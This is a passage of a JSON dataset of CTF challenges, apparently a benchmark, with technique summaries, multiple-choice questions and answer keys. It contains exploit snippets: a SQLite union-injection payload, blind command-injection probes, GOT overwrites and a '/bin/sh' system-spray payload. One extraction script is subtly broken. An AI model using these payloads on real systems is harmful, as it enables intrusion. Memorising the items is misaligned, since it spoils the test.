            "During a Capture the Flag challenge focusing on RSA encryption vulnerabilities, the participants encountered a situation where automated data collection of ciphertexts and public keys was hindered by Proof of Work (PoW) requirements. What approach could optimize the computation process in this scenario? - A. Sequential computation of the Chinese Remainder Theorem - B. Employment of a parallel solver for the Chinese Remainder Theorem to divide and conquer the data - C. Use of a single-threaded script to process each ciphertext one by one - D. Limiting the data collection to a few ciphertexts to reduce computation needs"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Bitflipper",
        "write_up": "dataset/raw/Bitflipper.md",
        "type": "reverse",
        "competition": [
            "DEFCON/2018/Quals",
            "https://ctftime.org/event/608/tasks/"
        ],
        "score": 177,
        "max_score": 500,
        "difficulty": 0.354,
        "knowledge": [
            "In scenarios involving ELF binaries with the ability to introduce controlled faults, such as bit flips, modifying the ELF header to transform the executable into a core dump format can force the server or system to output the entire binary. This method relies on understanding the ELF file structure and identifying key bits whose modification would change the file's behavior or classification. Specifically, flipping bits at certain positions in the ELF header can make it recognized as a core dump, prompting systems to handle it differently, often providing valuable information or the binary itself for analysis.",
            "For exploiting ELF binaries by manipulating relocation entries, particularly the `Elf64_Rela` structure in the PLT (Procedure Linkage Table) relocation table, modifying fields like `r_offset` (which controls where to write) and `r_addend` (which controls what to write) can redirect function calls to arbitrary locations. This technique allows for controlling the execution flow, especially useful when functions like `system` or `execve` are not directly callable due to constraints like argument setup or distance in memory space. Carefully calculating the effects of bit flips can redirect execution to useful gadgets or functions within the binary or shared libraries it uses. A practical application of this is flipping specific bits in the `Elf64_Rela` structure of selected functions to misdirect their execution flow towards gadgets that can lead to arbitrary code execution.\n\nExample payload manipulation for `Elf64_Rela` structure to jump to a gadget: Flip bits `0x7fa*8 +1`, `+4`, and `+7` to alter the execution flow and make the program jump to an address offset leading to a gadget executing a useful function like spawning a shell."
        ],
        "question": [
            "When transforming an executable into a core dump format to extract the binary from a server, which bits in the ELF header need to be flipped based on the scenario provided? - A. Bits `64`, `65`, and `66` in the ELF header. - B. Bits `128`, `129`, and `130` in the ELF header. - C. Bits `256`, `257`, and `258` in the ELF header. - D. Bits `512`, `513`, and `514` in the ELF header.",
            "In the context of exploiting ELF binaries by manipulating the `Elf64_Rela` structure to redirect execution flow, which bit flips in the `Elf64_Rela` structure of the `opendir` function are used to make the program jump to a privileged gadget, as described in the provided scenario? - A. Flip bits `0x7fa*8 + 2`, `+5`, and `+8`. - B. Flip bits `0x7fa*8 + 1`, `+3`, and `+6`. - C. Flip bits `0x7fa*8 +1`, `+4`, and `+7`. - D. Flip bits `0x7fb*8 +2`, `+5`, and `+8`."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Bits",
        "write_up": "dataset/raw/Bits.md",
        "type": "crypto",
        "competition": [
            "CSAW/2021/Quals",
            "https://ctftime.org/event/1315/tasks/"
        ],
        "score": 497,
        "max_score": 500,
        "difficulty": 0.994,
        "knowledge": [
            "When facing a discrete logarithm problem in a CTF challenge where the factorization of \\(N\\) is required, and an oracle is available that reveals some bits of the secret exponent \\(d\\) from \\(g^d \\mod N\\), one can use a binary search technique to determine the higher order bits of \\(d\\). This is actionable by interactively querying the oracle with carefully constructed inputs to gradually narrow down the range of possible values for the leading bits. Such inputs might involve padding the exponent with a specific pattern of bits (e.g., setting the last \\(n\\) bits to 1) to influence the oracle's output in a predictable way. This method requires an understanding of the oracle's behavior and the mathematical properties of the discrete logarithm being exploited.\n\nExample steps in pseudo-python code:\n```python\n# Assume b represents the bit position returned by the oracle.\ndef pad(k): \n    return k*2**(b+1) | (2**(b+1)-1)\n\n# Binary search to narrow down the higher order bits.\nhi = 2**124\nlo = 2**123\nwhile lo+1 < hi:\n    mid = (lo + hi)//2\n    if query(pad(mid)) == 1:  # Assuming query() sends to oracle and returns bit\n        lo = mid\n    else:\n        hi = mid\n```",
            "To factorize \\(N\\) when part of the discrete logarithm is known (including a situation where an oracle provides information about \\(d\\)), one can consider the case when \\(N\\) is the product of two primes, \\(p\\) and \\(q\\), and utilize the order of the group generated by \\(g\\) modulo \\(N\\). If the order is approximately known through interactions with the oracle, such as determining a value \\(m_k\\) closely related to the multiplicative order, the Carmichael function \\(\\lambda(N)\\) or Euler's totient function \\(\\phi(N)\\) can be estimated to ascertain \\(p\\) and \\(q\\). This factorization approach assumes some knowledge about the structure of \\(N\\) and relies on number theory concepts such as the multiplicative order and prime factorization.\n\nExample steps in pseudo-python code for estimating \\(\\phi(N)\\) and factorizing \\(N\\):\n```python\n# Assuming hi approximates k*phi(N) and qs is a guess related to N structure\nqs = 2\nk = (hi + N//qs) // (N//qs)\nphi = (hi//k) * qs\n\n# Method to approximate integer square root\ndef _sqrt(n):  \n    lo = 0  \n    hi = n\n    while lo+1 < hi:\n        mid = (lo+hi) // 2\n        if mid*mid <= n:\n            lo = mid  \n        else:  \n            hi = mid\n    return lo\n\n# Calculate p and q\npplusq = N - phi + 1\npminq = _sqrt(pplusq*pplusq - 4*N)\nq = (pplusq + pminq) // 2\np = pplusq - q\n```\n\nThis knowledge provides a roadmap for tackling encryption challenges in CTF competitions that revolve around discrete logarithm problems and necessitate factorization of a modulus as part of the solving process."
        ],
        "question": [
            "When attempting to use a binary search approach to find the higher order bits of a secret exponent \\(d\\) in a discrete logarithm problem, given an oracle that provides specific bit information, which of the following best describes how one might prepare their queries?  - A. Multiplying the oracle input by a random large number to increase the range of possible outputs. - B. Adding a known constant to each input to shift the oracle's response deterministically. - C. Padding the query exponent with a specific pattern of bits to influence the oracle's response for higher order bit determination. - D. Dividing the query input by a factor of \\(N\\) to directly reveal higher order bits through the oracle. ",
            "In the context of factorizing \\(N\\) using information about the discrete logarithm \\(d\\) and interactions with an oracle, what method involves estimating Euler's totient function \\(\\phi(N)\\) to facilitate the factorization?  - A. By approximating the value of \\(\\phi(N)\\) using a guessed divisor of \\(N\\) and adjusting based on the oracle's feedback on \\(d\\). - B. Directly querying the oracle with \\(N\\) and interpreting the response as an estimate of \\(\\phi(N)\\). - C. Utilizing the oracle's feedback to directly compute \\(p\\) and \\(q\\) without estimating \\(\\phi(N)\\). - D. Solving for \\(\\phi(N)\\) using the difference between \\(N\\) and the sum of its prime factors identified through oracle queries. "
        ],
        "answer": [
            "C.",
            "A."
        ]
    },
    {
        "name": "blank",
        "write_up": "dataset/raw/blank.md",
        "type": "This is a web challenge.",
        "competition": [
            "ImaginaryCTF/2023",
            "https://ctftime.org/event/2015/tasks/"
        ],
        "score": 100,
        "max_score": 490,
        "difficulty": 0.20408163265306123,
        "knowledge": [
            "In a SQL injection challenge where direct data extraction is not feasible due to an empty database, leveraging SQLite's built-in tables such as `sqlite_master` can facilitate an injection that alters the query result. This bypass can be achieved with a union injection, which allows for the selection and display of data from another table, even when the original query's target table is empty. This technique relies on the SQL injection vulnerability wherein input directly influences the query without proper sanitization or parameterization.  \nExample payload: For a username and password form, inputting `admin` as the username and `\" union select rootpage, type, name from sqlite_master --` as the password may execute the bypass.",
            "When exploiting SQL injection vulnerabilities, especially in SQLite, utilizing comments (`--`) at the end of the injection payload is crucial to comment out the remainder of the original SQL query. This ensures that the injected SQL code runs without interference from the subsequent parts of the original SQL command. This technique is applicable in scenarios where the injection point is within a larger query, and the attacker needs to ensure that only their crafted manipulation executes.  \nExample payload: `\" union select rootpage, type, name from sqlite_master --`"
        ],
        "question": [
            "In an SQL injection scenario where the target database is empty, how can you achieve a successful injection to display data from SQLite's built-in tables using a union injection? - A. Concatenate the malicious SQL with the legitimate query using `||` to merge results. - B. Use a union injection with a payload like `\" union select rootpage, type, name from sqlite_master --` to select data from a built-in table like `sqlite_master`. - C. Modify the SQL query to include a WHERE clause that filters records based on a condition that always returns true. - D. Inject a DROP TABLE command to remove security constraints before attempting data extraction.",
            "When performing a SQL injection attack in SQLite, why is it crucial to append comments (`--`) at the end of the injection payload? - A. To increase the payload length for buffer overflow exploitation. - B. To annotate the malicious code for clarity and future reference. - C. To comment out the remainder of the original SQL query, ensuring only the injected query executes. - D. To trigger a syntax error that diverts the database engine's flow, revealing hidden information."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Blind Shell",
        "write_up": "dataset/raw/Blind Shell.md",
        "type": "misc",
        "competition": [
            "kksctf/2020",
            "https://ctftime.org/event/1112/tasks/"
        ],
        "score": 345,
        "max_score": 411,
        "difficulty": 0.8394160583941606,
        "knowledge": [
            "When dealing with blind command injection vulnerabilities, where output only indicates success or failure, use conditional commands based on output success to infer the presence or absence of specific files, file contents, or directory listings. Commands like `ls`, `wc`, and `grep` can be combined to derive information about the file system layout, the number of files present, or even the content of files, by iterating through possible values and observing the binary outcome. This approach is viable when direct output is suppressed or not indicative of the executed command's result.  \nExample payload for deriving file names: `ls | grep ^f | wc -l | grep 1`",
            "In scenarios where the environment restricts direct directory navigation or the inspection of file contents through conventional means (e.g., using 'cd' to change directories or 'cat' to read file contents), leveraging scripts to perform blind extraction of information can be effective. Python scripts utilizing loops and conditional operations can be adapted to iteratively guess and confirm the presence of characters in file names or file contents. This is applicable in environments that give binary success or failure feedback for executed commands. By successively refining the guess based on the binary feedback, it is possible to reconstruct the desired information character by character.  \nExample payload to read content from a file in a blind manner:  \n```python\nfrom pwn import *\nalphabet = '_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}!\"#()+,-/:;<=>?@[]^'\nconn = remote('example.ctf.com', 30010)\nconn.sendline(\"cat targetfile.txt | grep ^S\")\nconn.recvline()\nread = 'S'\nwhile True:\n    for i in alphabet:\n        test = read + i\n        print(test)\n        conn.sendline(\"cat targetfile.txt | grep \" + test)\n        if chr(r[2]) == 'S':  \n            read = test\n            break\nprint(\"Extracted content: \", read)\n```"
        ],
        "question": [
            "In a scenario involving a blind command injection vulnerability where direct output is not available, which of the below command sequences would be effective for determining the presence of files starting with the letter 'f' in the current directory given the binary success or failure response from the system? - A. `ls | grep ^f | wc -l | grep 1` - B. `ls -a | grep f*` - C. `find / -name f*` - D. `echo f | ls -l`",
            "When attempting to extract information from a file named \"flag.txt\" in a restricted shell environment that only provides success or failure feedback for commands, which Python script strategy would be effective for determining the content starting with the letter 'L'? - A. Using a loop to iterate through a set of characters, appending to the string being tested upon receiving a success response. - B. Directly reading the file content using `file.read()` without testing individual characters. - C. Employing regular expressions to match the entire expected content in one command without iterative testing. - D. Utilizing a single command to change directories and read the file in one step despite restrictions."
        ],
        "answer": [
            "A",
            "A"
        ]
    },
    {
        "name": "Blob 200",
        "write_up": "dataset/raw/Blob 200.md",
        "type": "forensics",
        "competition": [
            "RITSEC/2021",
            "https://ctftime.org/event/1309/tasks/"
        ],
        "score": -1,
        "max_score": 925,
        "difficulty": -1,
        "knowledge": [
            "When analyzing a git repository for hidden or obfuscated data, it's vital to manually inspect the `.git/objects` directory for unreferenced or dangling objects which might not appear in the commit history accessed through normal commands (`git log`, `git show`, etc.). This can reveal commits, blobs, and other data that are part of the repository's history but are no longer referenced by any branch or tag.",
            "In challenges involving git repositories, directly examining the SHA-1 hashes associated with git objects (commits, trees, blobs) can lead to discovering hidden content or flag information. This involves using `git show` followed by the object's hash to potentially uncover data not easily found through standard repository navigation commands."
        ],
        "question": [
            "When investigating a git repository for potentially hidden content, which directory should be manually inspected for unreferenced or dangling objects not visible in the standard commit history? - A. /.git/hooks - B. /.git/objects - C. /.git/config - D. /.git/refs",
            "To uncover hidden content or flag information within a git repository, what command should be used in conjunction with the SHA-1 hash of git objects? - A. git status followed by the object's hash - B. git log followed by the object's hash - C. git show followed by the object's hash - D. git branch followed by the object's hash"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "block-game",
        "write_up": "dataset/raw/block-game.md",
        "type": "reverse",
        "competition": [
            "TJCTF/2022",
            "https://ctftime.org/event/1599/tasks/"
        ],
        "score": 350,
        "max_score": 500,
        "difficulty": 0.7,
        "knowledge": [
            "When facing a Java application that crashes due to `java.lang.OutOfMemoryError`, increasing the Java heap space can be a viable solution to prevent the crash and continue with the application analysis. This can be done by using the `-Xmx` option followed by the amount of memory (e.g., `-Xmx2000m` for 2000 megabytes) when executing the Java application.   \nExample command: `java -Xmx2000m -jar application.jar`",
            "In challenges involving manipulating game world data or similar binary data manipulation tasks, analyzing changes in binary files before and after specific actions (e.g., clicking, saving) can reveal how data is structured or encoded. This approach can be particularly useful when trying to understand how actions within a game or application map to changes in its data files. Based on this information, you can write scripts to manipulate or interpret the binary data directly, which is especially useful when GUI actions are too slow or cannot be easily automated.  \nExample approach: Use a Python script to compare binary files byte by byte to identify changes and deduce the structure or encoding of the data, then manipulate the data accordingly to achieve the desired outcome (e.g., revealing hidden messages, extracting flags)."
        ],
        "question": [
            "When encountering a `java.lang.OutOfMemoryError` while trying to run a Java application from a capture-the-flag challenge, which of the following commands correctly increases the Java heap space to 2000 megabytes to prevent the crash? - A. `java -Xms2000m -jar application.jar` - B. `java -X -2000m -jar application.jar` - C. `java -Xmx2000m -jar application.jar` - D. `java --memory=2000m -jar application.jar`",
            "In a scenario where you're analyzing the effects of a mouse click in a game's world data file, which Python code snippet correctly compares the data of `data_click_before.dat` and `data_click_after.dat` to find changes at specific offsets after a mouse click event? - A. `f1 = open(\"data_click_before.dat\", \"r\"); f2 = open(\"data_click_after.dat\", \"r\"); diff = set(f1) - set(f2)` - B. `with open(\"data_click_before.dat\") as f1, open(\"data_click_after.dat\") as f2: print(f1.read() == f2.read())` - C. `f1 = open(\"data_click_before.dat\", \"rb\"); f2 = open(\"data_click_after.dat\", \"rb\"); print(f1.read() == f2.read())` - D. `f1 = open(\"data_click_before.dat\", \"rb\"); f2 = open(\"data_click_after.dat\", \"rb\"); f1.read(17); f2.read(17); for y in range(2000): for x in range(3000): b1 = f1.read(4); b2 = f2.read(4); if b1 != b2: print(y, x, b1, b2)`"
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "BLOCKchain",
        "write_up": "dataset/raw/BLOCKchain.md",
        "type": "reverse",
        "competition": [
            "Square/2022",
            "https://ctftime.org/event/1756/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When dealing with macOS-specific binary protections and anti-debugging measures in a reversing challenge, one effective technique is using `DYLD_INSERT_LIBRARIES` to inject custom libraries that can modify the program's behavior or disable certain security checks. This method can be particularly useful for stubbing out functions like antidebug checks by creating a library that contains a constructor function to unset relevant environment variables or directly modify function behavior, such as antidebugging routines. This approach allows for real-time modification of the binary's execution without altering the original binary.\n   - **Condition:** This approach is applicable in scenarios where the target binary is a macOS application that employs environment variables or specific functions to implement anti-debugging techniques.\n   - **Example:** If the target binary checks for the presence of a debugger using an environment variable, one can create a dynamic library with a constructor function like below, compile it, and use `DYLD_INSERT_LIBRARIES` to inject it into the application's process space.\n     ```c\n     __attribute__((constructor))\n     void disable_antidebug() {\n         unsetenv(\"DYLD_INSERT_LIBRARIES\");  // Unset the env var used by binary for checks\n     }\n     ```",
            "In reverse engineering challenges, especially those involving custom VMs and bytecode formats, understanding and patching out artificial delay mechanisms like various implementations of `sleep()` functions can significantly speed up the analysis and execution process, allowing one to retrieve the flag or desired output more efficiently. These delay mechanisms are often introduced as time-wasters and can be identified and removed by analyzing the bytecode or VM syscall implementations.\n   - **Condition:** This strategy is suited for reversing challenges that include custom virtual machines or unique execution environments with implemented delay mechanisms to slow down analysis or execution.\n   - **Example:** Without a specific bytecode or function to reference, the principle involves identifying the sleep function calls within the custom VM bytecode or syscall table and then modifying these calls to be no-ops or replacing them with instructions that have minimal delay. This could be as simple as changing the bytecode or patching the binary execution file."
        ],
        "question": [
            "When attempting to counteract macOS-specific anti-debugging techniques in a binary, which of the following methods correctly describes a way to use `DYLD_INSERT_LIBRARIES` to inject a custom library that disables such checks?  - A. Edit the binary in a hex editor to directly remove calls to the anti-debugging functions. - B. Use the `DYLD_INSERT_LIBRARIES` environment variable to load a dynamic library that executes a function to delete critical binary files. - C. Compile a dynamic library with a constructor function that unsets critical environment variables used by the binary for anti-debugging checks, and inject it using `DYLD_INSERT_LIBRARIES`. - D. Modify the system's dynamic linker to ignore all DYLD environment variables. ",
            "In the context of reverse engineering a challenge that contains a custom VM with artificial delay mechanisms like diverse `sleep()` functions, what technique would be effective in speeding up the process to retrieve the flag?  - A. Increase the system's clock speed to reduce the real-time impact of `sleep()` function calls within the VM. - B. Identify and modify the `sleep()` calls within the VM's bytecode or syscall table to become no-ops or instructions that cause trivial delay. - C. Use a standard debugger to step over each `sleep()` call manually, thereby ignoring their delay. - D. Rewrite the VM's execution engine in a more efficient programming language. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "book",
        "write_up": "dataset/raw/book.md",
        "type": "pwn",
        "competition": [
            "0CTF/2021/Quals",
            "https://ctftime.org/event/1356/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When facing a binary exploitation challenge with Partial RELRO and PIE enabled, targeting GOT entries for overwriting becomes a feasible attack vector, especially when arbitrary read/write primitives are identified. This attack can be particularly effective if the binary has a vulnerable function that allows for controlled read and write operations at specific offsets. This scenario demonstrates that exploiting GOT with arbitrary read/write can leverage the partial overwrite tactic, useful when dealing with format string vulnerabilities that terminate at null bytes. For leaking libc addresses, functions within the GOT that are perfectly aligned with the offset required by the vulnerability, such as `open` in the context of a `%s` format string vulnerability, allow for efficient address leakage and libc version identification.",
            "In scenarios where the challenge binary facilitates a controlled overwrite of GOT entries, choosing to overwrite function entries that will be called immediately after exploitation can create a straightforward path to arbitrary code execution. For instance, overwriting the `atoi` GOT entry with the address of `system`, while ensuring existing calls in the program can be repurposed as arbitrary command execution triggers, provides a practical approach to achieving a shell. This method relies on predicting program behavior post-overwrite, such as ensuring the next user input is passed to the overwritten function (`atoi` in this instance), transforming normal program execution flow into an exploitable one. Example payload for overwriting `atoi` with `system` could include calculating the index for `atoi` in the GOT based on known addresses and offsets, followed by crafting a payload that combines the desired `system` address with controlled input to execute a command."
        ],
        "question": [
            "When exploiting a binary that utilizes Partial RELRO and PIE enabled, which of the following strategies best utilizes the described arbitrary read and write vulnerabilities for leaking addresses and overwriting GOT entries? - A. Exploit the full RELRO by overwriting stack canaries. - B. Bypass Partial RELRO and PIE by using brute-force attacks on stack addresses. - C. Utilize arbitrary read/write vulnerabilities to leak libc addresses from GOT and overwrite GOT entries with system address. - D. Deploy shellcode on the stack to perform a return-to-libc attack without needing to bypass NX.",
            "In a binary exploitation challenge where the exploit strategy involves overwriting the GOT entry of a function to gain arbitrary code execution, which function is strategically chosen for overwriting with the address of `system` to ensure that the next user input triggers arbitrary command execution? - A. Overwrite the `printf` function, assuming that it will format user input directly after exploitation. - B. Overwrite the `strcpy` function, hoping that a copy operation follows the exploitation phase. - C. Overwrite the `atoi` function, given that the next input will be passed to `atoi`, enabling execution of a shell. - D. Overwrite the `exit` function, predicting that the program will call it last, executing arbitrary commands on its invocation."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Bookshelf",
        "write_up": "dataset/raw/Bookshelf.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": 363,
        "max_score": 500,
        "difficulty": 0.726,
        "knowledge": [
            "In scenarios utilizing custom encoding or token generation mechanisms, such as BWT (Binary Web Tokens) in place of JWT (JSON Web Tokens), analyze the encoding process for potential vulnerabilities that could arise from differences in handling string lengths or character encoding. Specifically, if the encoding mechanism involves treating multi-byte characters differently or relies on string and byte lengths inconsistently, it may be possible to craft payload that alters the intended structure or data of the token. This can potentially lead to authorization bypass or other unintended behaviors by manipulating encoded data to inject or modify encoded values, such as user roles, permissions, or identifiers.",
            "When interacting with web applications that allow user input, especially those storing input data into backend systems like databases, inspect the application's handling of data fields not explicitly utilized or validated by the backend. If a web application frontend allows sending additional, unvalidated or unfiltered data fields to the server, and the server-side application blindly stores or processes this data, it provides an avenue for attacking the integrity of the application's data. Attackers can exploit this by crafting payloads that, when processed or evaluated by the server, may lead to elevation of privileges, data leakage, or unauthorized actions, even if those fields are not directly used or acknowledged by the application's primary functionalities."
        ],
        "question": [
            "In a custom token implementation using BWT (Binary Web Tokens) that involves a specific encoding process, which vulnerability can be exploited if the encoding scheme treats multi-byte characters differently than single-byte characters? - A. Buffer overflow attacks due to fixed memory allocation. - B. Injection attacks by encoding malicious scripts into multi-byte characters. - C. Manipulating encoded data to inject or modify values by crafting payloads with multi-byte characters that are processed differently from single-byte characters. - D. Brute force attacks on the token generation algorithm by exploiting weak random number generators.",
            "When a web application's backend does not explicitly validate or filter incoming data fields that are submitted by the frontend, which security risk is most likely being exposed? - A. The risk of denial of service (DoS) attacks by overwhelming the application with large volumes of data. - B. The potential for attackers to craft payloads that exploit the server's processing of unvalidated data, leading to elevation of privileges or unauthorized actions. - C. The exposure of confidential data through direct access to backend databases using SQL injection in unvalidated input fields. - D. Vulnerability to cross-site scripting (XSS) attacks by embedding malicious scripts in data fields not sanitized by the backend."
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Bop It",
        "write_up": "dataset/raw/Bop It.md",
        "type": "pwn",
        "competition": [
            "angstrom/2020",
            "https://ctftime.org/event/982/tasks/"
        ],
        "score": 80,
        "max_score": 300,
        "difficulty": 0.26666666666666666,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities linked with string operations, specifically where the vulnerability involves handling a NULL byte (`\\x00`), one can leverage the discrepancy between the `read` function's behavior (which counts raw bytes including NULL bytes) and the `strlen` function's behavior (which stops counting at the first NULL byte). This can lead to situations where the application thinks it has read more data into a buffer than it has actually processed, enabling memory leak exploits or buffer overflows. This technique can be particularly effective in challenges where input is directly processed and compared against in-memory data, and where the program's incorrect calculation of input length can be used to trigger incorrect memory operations.\n\n   Example Payload: `'\\x00' + 'A'*size`  \n   The payload starts with a NULL byte to stop `strlen` from counting beyond it, followed by a series of 'A' characters to increase the `read` function's return value without affecting the `strlen` result, creating a buffer overflow or memory leak.",
            "For challenges that involve interacting with a binary over a network (using netcat `nc` or similar tools), automation scripting with tools like `pwntools` can be invaluable. This approach can systematically test various inputs to exploit vulnerabilities like buffer overflows, memory leaks, or function misbehaviors. When dealing with games or interactive challenges that require sending specific inputs in response to program output, a script can be crafted to read the output, decide on the correct response, and then send potentially exploitative data when the conditions are met.\n\n   Example Usage:  \n   ```python\n   from pwn import *\n   \n   def exploit(remote_addr, remote_port, payload):\n       p = remote(remote_addr, remote_port)\n       while True:\n           response = p.readuntil('it!')\n           if 'Condition1' in response:\n               p.sendline('Response1')\n           elif 'Condition2' in response:\n               p.sendline('Response2')\n           elif 'ExploitCondition' in response:\n               p.sendline(payload)\n               break\n       print(p.recvall())\n   ```\n   \n   This script template showcases how to connect to a remote service, interact with it based on its output, and send a payload under the right condition, which is a common tactic in binary exploitation challenges."
        ],
        "question": [
            "In a cybersecurity challenge that involves exploiting a buffer overflow vulnerability due to differences in how the `read` and `strlen` functions handle NULL bytes, which of the following statements accurately describes a successful exploitation approach? - A. Use a large number of NULL bytes to fill up the buffer and trigger an overflow error. - B. Preface a string of arbitrary length with a NULL byte to exploit the discrepancy between `read` and `strlen`. - C. Employ a string comprised entirely of NULL bytes to bypass memory protections. - D. Append a NULL byte at the end of a long string to force `strlen` to read beyond the actual length. ",
            "When writing a script to automate the exploitation of a binary over a network as part of a Capture The Flag (CTF) challenge, which approach is most effective for interacting with the program based on its prompts and triggering a vulnerability? - A. Manually send a sequence of predetermined responses without reading the program's output. - B. Use a random string generator for each response to maximize the unpredictability of the input. - C. Carefully read the program's output and respond with crafted inputs based on the conditions met, including sending a specific exploit payload when appropriate. - D. Constantly send the same input to every prompt, aiming to overflow the buffer through brute force. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Borraccia",
        "write_up": "dataset/raw/Borraccia.md",
        "type": "misc",
        "competition": [
            "TeamItaly/2023",
            "https://ctftime.org/event/2088/tasks/"
        ],
        "score": 453,
        "max_score": 500,
        "difficulty": 0.906,
        "knowledge": [
            "In a scenario where the application uses a class that suffers from the mutable default argument vulnerability, a shared mutable object (e.g., dictionary) across instances can be exploited by ensuring that every instance of that class refers to and mutates the same data. This knowledge is particularly useful for exploiting custom implementations where an object is expected to maintain isolated state across its instances. In such cases, manipulating one instance's state will affect all instances, potentially leading to unintended access or modification of application data.",
            "Exploiting string formatting vulnerabilities can lead to information disclosure or unintended behavior in applications that use dynamic string formatting with untrusted input. If a logging function or similar constructs use Python's `str.format()` method without proper input sanitization, it can be manipulated to trigger exceptions revealing sensitive information or to bypass restrictions. This technique is useful when you can control some portion of the format string and the application logic performs operations based on the formatted string outcome. To mitigate against simple blacklist-based input filtering, placing payloads in parts of the request not subject to the same filtering (e.g., request parameters vs headers) can provide a bypass mechanism.  \nExample payload: Setting the request parameter to `%(&b=)s` and the header to manipulate the format string accordingly, enabling the exploitation of the string formatting vulnerability to disclose sensitive information or trigger desired application behavior."
        ],
        "question": [
            "In a Python application, a class named `ObjDict` is implemented to mimic JavaScript object behavior with dictionary-backed storage. However, this class is defined to accept a mutable default argument in its constructor, specifically a dictionary (`{}`). Given this information, which of the following actions introduces a security vulnerability related to the mutable default argument vulnerability?  - A. Instantiating multiple `ObjDict` instances without passing any arguments. - B. Creating a new `ObjDict` instance by providing an empty list as an argument. - C. Accessing dictionary items using the `__getitem__` method. - D. Deleting an item from the dictionary using the `__delitem__` method. ",
            "During an attack on a web application, an attacker notices that the application uses dynamic string formatting with user-supplied input for logging purposes. The application's logging function attempts to sanitize input by using a blacklist that removes specific characters from header values before they are inserted into the format string. However, the attacker can place payloads in parts of the request not subject to this filtering, such as request parameters. Which of the following payloads correctly exploits the string formatting vulnerability without being stopped by the blacklist filtering `[%\".\\n'!:]`?  - A. Using the payload `{0[request][a.title()]}` in an HTTP header. - B. Placing payload `%(flag)s` directly in the request body to leak sensitive data. - C. Setting request parameter to `%(&b=)s` and crafting a header value to trigger the use of unfiltered request parameters in the format string. - D. Encoding blacklist characters in hex or HTML entities to bypass the blacklist filtering in headers. "
        ],
        "answer": [
            "A",
            "C"
        ]
    },
    {
        "name": "Bowrain",
        "write_up": "dataset/raw/Bowrain.md",
        "type": "pwn",
        "competition": [
            "SecurityFest/2018",
            "https://ctftime.org/event/622/tasks/"
        ],
        "score": 261,
        "max_score": 499,
        "difficulty": 0.5230460921843687,
        "knowledge": [
            "In scenarios where a program does not properly terminate strings, it is possible to leak memory addresses. This is exploitable especially in functions that print back user-controlled data without null termination, allowing an attacker to infer the Process Instruction (PIE) base address or other sensitive information from the leaked output. This technique can be applied to bypass ASLR (Address Space Layout Randomization) by leaking addresses of functions or variables.",
            "When dealing with integer overflow vulnerabilities, specifically with the `abs()` function and modulus operation, it is crucial to remember that `abs(INT_MIN)` remains negative and a modulus operation with a negative operand can produce negative results. These vulnerabilities can lead to unexpected behavior such as out-of-bounds read or write if user input is used to calculate array indices or pointers. By carefully crafting input (e.g., using `INT_MIN` or similar boundary values), an attacker can manipulate the control flow or corrupt memory in predictable ways, such as redirecting execution to a `system()` call for arbitrary code execution. \n\nExample payload section to manipulate function pointer table for arbitrary code execution:\n```python\npayload = \"2147483648\" + \"\\x00\" + \"/bin/sh\\x00\"\npayload += \"A\" * 5\nassert len(payload) == 0x18\npayload += ((0x80 - len(payload)) / 8) * p64(base + 0x958)\n# Spraying the address of system, so any access of function pointer table with a negative index > -7 (by % operation) will give address of system\nsh.send(payload + \"\\n\")\n```"
        ],
        "question": [
            "Which of the following best explains why failing to properly null-terminate strings in a C program can lead to security vulnerabilities? - A. It can cause the compiler to generate inefficient bytecode, leading to performance degradation. - B. It enables an attacker to execute arbitrary code by directly manipulating memory addresses in the print function. - C. It can lead to memory address leaks if the program prints back user-controlled data, potentially bypassing ASLR. - D. It prevents the garbage collector from freeing up unused memory, causing a denial of service.",
            "When exploiting an integer overflow vulnerability involving the `abs()` function and modulus operation, which of the following inputs could an attacker use to manipulate control flow or corrupt memory? - A. \"0\" + \"\\x00\" + \"/bin/bash\\x00\" - B. \"2147483647\" + \"\\x00\" + \"-c calc\\x00\" - C. \"2147483648\" + \"\\x00\" + \"/bin/sh\\x00\" - D. \"32768\" + \"\\x00\" + \"echo hacked\\x00\""
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "bpf_badjmp",
        "write_up": "dataset/raw/bpf_badjmp.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2021",
            "https://ctftime.org/event/1372/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "To exploit eBPF programs that permit arbitrary kernel memory read, one can leverage bugs that allow for manipulating jump instructions, especially backward jumps, to redirect execution flow to unintended instructions. This method often involves creating a scenario where, due to a flaw in the handling of jump instruction offsets during instruction expansion, the program counter is redirected to execute an unintended sequence of instructions. A common approach to achieve backward jumps without introducing unreachable code or loops involves manipulating register values to ensure jumps are always taken. This technique relies on understanding the internal mechanics of instruction patching and jump address calculation within the eBPF verifier and exploiting discrepancies in this logic.",
            "When exploiting ALU sanitation patches in eBPF to manipulate pointer arithmetic for arbitrary memory access, it is beneficial to understand how certain operations on registers are expanded into multiple instructions by the verifier. Specifically, operations that involve adding or subtracting a scalar value from a pointer can trigger an expansion where multiple instructions are inserted to check and sanitize the scalar value. By carefully planning the exploit payload to manipulate this behavior, it is possible to control the pointer manipulation, allowing for arbitrary read or write operations. One critical aspect is ensuring that the scalar value used in the arithmetic operation does not cause an out-of-bounds access, which can be achieved by setting up the environment in a way that passes the verifier's checks yet leads to the desired memory access at runtime."
        ],
        "question": [
